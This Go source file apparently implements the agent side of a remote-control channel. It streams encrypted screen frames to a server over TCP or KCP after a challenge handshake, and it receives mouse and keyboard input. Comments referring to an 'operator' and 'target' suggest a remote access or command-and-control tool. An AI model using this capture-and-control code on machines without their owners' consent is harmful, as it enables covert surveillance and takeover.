package transport

// RCPClient is the agent side of the remote-control channel: a long-lived TCP
// connection to the server's RCP listener that streams screen frames at a fixed
// rate (independent of the polling sleep) and receives mouse / keyboard input.

import (
	"crypto/rand"
	"encoding/hex"
	"errors"
	"fmt"
	"net"
	"os"
	"runtime"
	"sync"
	"time"

	"github.com/xtaci/kcp-go/v5"

	"github.com/user/wisp/shared/protocol"
)

// recoverPanic logs a background goroutine panic without taking down the agent.
func recoverPanic(where string) {
	if r := recover(); r != nil {
		buf := make([]byte, 1<<16)
		n := runtime.Stack(buf, true)
		fmt.Fprintf(os.Stderr, "[agent] PANIC in %s: %v\n%s\n", where, r, buf[:n])
	}
}

// RCPClient streams screen frames and consumes input events. Proto selects the
// transport: "tcp" (default) or "kcp" (fast UDP-based channel). The transport
// is set by the server per remote-control window via CmdRCPConnect args.
type RCPClient struct {
	Host      string
	AgentID   string // hex-encoded agent id
	Keys      *protocol.SessionKeys
	RSAPubPEM string
	Proto     string // "tcp" or "kcp"
	UseTLS    bool
	Fingerprint string

	// Capture produces one JPEG frame (bytes, width, height). Set by the agent.
	Capture func(quality int) ([]byte, int, int, error)
	// OnInput receives a JSON input message from the server.
	OnInput func(msg string)

	Quality  int
	Interval time.Duration

	mu   sync.Mutex
	conn net.Conn
	stop chan struct{}
	done chan struct{}
	seq  uint64

	// captureErrCount counts consecutive capture failures. A single transient
	// failure (e.g. a busy desktop) must not tear the channel down; only a
	// sustained failure (e.g. no accessible display) closes it, after the
	// reason has been reported to the operator.
	captureErrCount int
}

// Connect dials the RCP listener, authenticates and starts the stream loops.
// An already-open channel is closed first.
func (c *RCPClient) Connect(port int) error {
	c.Close()

	// Default transport is KCP; only an explicit "tcp" opts into TCP.
	if c.Proto == "" {
		c.Proto = "kcp"
	}

	addr := net.JoinHostPort(c.Host, fmt.Sprintf("%d", port))
	var conn net.Conn
	var err error
	if c.Proto == "kcp" {
		var sess *kcp.UDPSession
		sess, err = kcp.DialWithOptions(addr, nil, 0, 0)
		if err != nil {
			return fmt.Errorf("rcp kcp dial: %w", err)
		}
		tuneKCP(sess)
		conn = sess
	} else {
		conn, err = net.DialTimeout("tcp", addr, 10*time.Second)
		if err != nil {
			return fmt.Errorf("rcp dial: %w", err)
		}
	}

	c.mu.Lock()
	c.conn = conn
	c.mu.Unlock()

	if err := c.handshake(conn); err != nil {
		_ = conn.Close()
		return err
	}

	c.mu.Lock()
	c.stop = make(chan struct{})
	c.done = make(chan struct{})
	c.captureErrCount = 0
	c.mu.Unlock()

	go c.run()
	return nil
}

// handshake verifies the server with a random challenge: the challenge is
// encrypted with the server RSA key (only the real server can decrypt it) and
// the reply must come back encrypted with our session keys.
func (c *RCPClient) handshake(conn net.Conn) error {
	challenge := make([]byte, 16)
	if _, err := rand.Read(challenge); err != nil {
		return err
	}

	// The agent id is stored hex-encoded (16 chars); the wire format uses the
	// raw 8 bytes so the server can hex-encode them back to the session id.
	rawID, err := hex.DecodeString(c.AgentID)
	if err != nil {
		return fmt.Errorf("decode agent id: %w", err)
	}
	hello, err := protocol.BuildRCPHello(rawID, challenge, []byte(c.RSAPubPEM))
	if err != nil {
		return err
	}
	if err := protocol.WritePacket(conn, hello); err != nil {
		return fmt.Errorf("write hello: %w", err)
	}

	_ = conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	ack, err := protocol.ReadPacket(conn)
	if err != nil {
		return fmt.Errorf("read ack: %w", err)
	}
	if ack.Type != protocol.TypeRCPAck {
		return fmt.Errorf("rcp handshake rejected (type 0x%02x)", ack.Type)
	}
	dec, err := c.Keys.Decrypt(ack.Payload)
	if err != nil {
		return fmt.Errorf("decrypt ack: %w", err)
	}
	if !stringEqual(dec, challenge) {
		return fmt.Errorf("rcp handshake challenge mismatch")
	}
	return nil
}

func stringEqual(a, b []byte) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

// run drives the frame loop and the input reader concurrently.
func (c *RCPClient) run() {
	defer close(c.done)
	defer recoverPanic("rcp.run")
	go c.readLoop()

	interval := c.Interval
	if interval <= 0 {
		interval = 50 * time.Millisecond // 20 fps default
	}
	quality := c.Quality
	if quality <= 0 {
		quality = 45
	}

	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	for {
		select {
		case <-c.stop:
			c.sendClose()
			return
		case <-ticker.C:
			c.sendFrame(quality)
		}
	}
}

// maxCaptureErrCount consecutive capture failures before the channel is closed.
const maxCaptureErrCount = 30

func (c *RCPClient) sendFrame(quality int) {
	if c.Capture == nil {
		c.notifyError("screen capture is not configured")
		return
	}
	data, w, h, err := c.Capture(quality)
	if err != nil {
		// Never silent: a failed capture (e.g. no X11 display on a Linux
		// target, a service-session agent on Windows) used to make the channel
		// look alive while streaming zero frames. Report the first failure to
		// the operator, and only close the channel after a sustained failure —
		// a single transient error (busy desktop) must not kill the stream.
		c.captureErrCount++
		if c.captureErrCount == 1 {
			c.notifyError("screen capture failed: " + err.Error())
		}
		if c.captureErrCount >= maxCaptureErrCount {
			c.Close()
		}
		return
	}
	c.captureErrCount = 0

	// Snapshot the connection and next sequence number under the lock, then
	// write outside it: a stalled KCP writer must not deadlock the reader.
	c.mu.Lock()
	conn := c.conn
	if conn == nil {
		c.mu.Unlock()
		return
	}
	c.seq++
	seq := c.seq
	c.mu.Unlock()

	// Encrypt the frame payload so screen content is not exposed on the wire
	payload := protocol.EncodeRCPFrame(seq, w, h, data)
	enc, err := c.Keys.Encrypt(payload)
	if err != nil {
		return
	}

	// Bound the write time. On a congested link (e.g. KCP backpressure) a write
	// must not freeze the stream loop forever: transient timeouts drop the
	// frame and let the next tick retry; hard errors tear the channel down.
	_ = conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
	if err := protocol.WritePacket(conn, &protocol.Packet{Type: protocol.TypeRCPFrame, Payload: enc}); err != nil {
		if errors.Is(err, os.ErrDeadlineExceeded) {
			return
		}
		c.Close()
	}
}

// readLoop consumes server messages (input events / close). The read deadline
// is long enough to outlive several server pings: the server only sends input
// events while the operator interacts, and otherwise keeps the channel alive
// with a keepalive ping every rcpPingInterval (10s). Without the ping a channel
// would be torn down after ~45s of pure viewing (the old "turns to 0 FPS" bug).
func (c *RCPClient) readLoop() {
	defer recoverPanic("rcp.readLoop")
	for {
		c.mu.Lock()
		conn := c.conn
		c.mu.Unlock()
		if conn == nil {
			return
		}
		_ = conn.SetReadDeadline(time.Now().Add(45 * time.Second))
		pkt, err := protocol.ReadPacket(conn)
		if err != nil {
			c.Close()
			return
		}
		switch pkt.Type {
		case protocol.TypeRCPInput:
			dec, err := c.Keys.Decrypt(pkt.Payload)
			if err != nil {
				continue
			}
			if c.OnInput != nil {
				c.OnInput(string(dec))
			}
		case protocol.TypeRCPPing:
			// keepalive — loop around and reset the read deadline
		case protocol.TypeRCPClose:
			c.Close()
			return
		}
	}
}

func (c *RCPClient) sendClose() {
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.conn != nil {
		_ = protocol.WritePacket(c.conn, &protocol.Packet{Type: protocol.TypeRCPClose})
	}
}

// notifyError sends a stream error to the server without closing the channel.
// The operator sees the reason in the remote-control window while the stream
// keeps trying (a transient failure must not kill the session).
func (c *RCPClient) notifyError(msg string) {
	c.mu.Lock()
	conn := c.conn
	c.mu.Unlock()
	if conn == nil {
		return
	}
	if enc, err := c.Keys.Encrypt([]byte(msg)); err == nil {
		_ = protocol.WritePacket(conn, &protocol.Packet{Type: protocol.TypeRCPError, Payload: enc})
	}
}

// reportError sends a stream error to the server, then tears the channel down.
func (c *RCPClient) reportError(msg string) {
	c.notifyError(msg)
	c.Close()
}

// Close tears down the channel and its loops.
func (c *RCPClient) Close() {
	c.mu.Lock()
	if c.stop != nil {
		select {
		case <-c.stop:
			// already closed
		default:
			close(c.stop)
		}
	}
	conn := c.conn
	c.conn = nil
	stopCh := c.stop
	c.mu.Unlock()

	if conn != nil {
		_ = conn.Close()
	}
	if stopCh != nil {
		select {
		case <-c.done:
		case <-time.After(2 * time.Second):
		}
	}
}

// Connected reports whether a channel is currently open.
func (c *RCPClient) Connected() bool {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.conn != nil
}
